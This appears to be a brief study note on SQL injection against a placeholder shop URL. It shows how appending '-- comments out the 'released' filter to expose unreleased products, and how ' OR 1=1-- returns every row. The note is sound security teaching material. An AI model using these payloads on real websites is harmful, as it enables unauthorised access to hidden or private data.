## retrieving hidden data

example of retrieving hidden data


vulnerable site: https://website.com/products?category=Gifts

the web application makes the following sql query to retrieve information of the relevant products from the db

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

sql query breakdown | explanation
--------------------|------------
SELECT * | all details
FROM products | from the products table
WHERE category = 'Gifts' | where the category is gifts
AND released = 1 | and released is 1

released =1 used to hide products that are not released. presumably, released = 0 used for unreleased products

https://website.com/products?category=Gifts'--

sql query:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

-- (double dash) sequence is a comment indicator in SQL, meaning anything following the -- is interpreted as an comment. so basically anything after the -- is ignored so 'AND released = 1' is ignored. this should cause the application to display all information, released and unreleased in the gifts category.

next you can take it a step further to display all information from all categories, including categories we dont know about.

https://website.com/products?category=Gifts'+OR+1=1--

sql query:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
this query will return all data where the category is either Gifts or 1 is equel 1. 1=1 is always true so the query will return all items.
